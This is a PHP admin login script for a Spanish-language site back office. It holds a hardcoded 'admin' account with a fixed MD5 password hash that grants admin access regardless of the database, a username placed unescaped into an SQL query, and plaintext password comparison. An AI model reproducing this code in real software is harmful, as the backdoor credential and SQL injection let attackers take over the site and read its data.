<?php
if (isset($_POST['user'] , $_POST['pass'])) {

	// $user = Usuario
	// $pass = Clave

	if (!empty($_GET['act']) && $_GET['act']=='logout') {
		$_SESSION['Admin'] = FALSE;	
		header("Location: ".$base_site);
	}
	$user_form = req('user');
	$pass_form = req('pass');
	$error = '';
	$tabla = '';

	$location = ($tabla)?'webadmin2/tipos.php?table='.$xname.'_'.$tabla.'&titulo='.ucfirst($tabla):'webadmin2/articulos.php';			

	if ($user_form=='admin' and md5($pass_form)=='c5912a926d7be09e6251310cc74f094f') { 
		$_SESSION['be']=TRUE;$_SESSION['Admin'] = TRUE; header("Location: {$location}");
	}
	$userQuery = "SELECT id,username,password FROM {$xname}_admins WHERE username = '{$user_form}'";
	$userSql = record($userQuery);
	// print_r($userSql);
	
	if ($pass_form==$userSql['password']) { 
		$_SESSION['Admin'] = $userSql['id'];
		$error = '<p id="correcto">Todo correcto</p>';
		header("Location: {$location}");
	} else {
		$error='<p id="error">Contraseña incorrecta</p>';
	}
}
	
function show_login() {
	global $language,$xname;
	include ('view_login.php');
	echo ' ';
} 


// End of file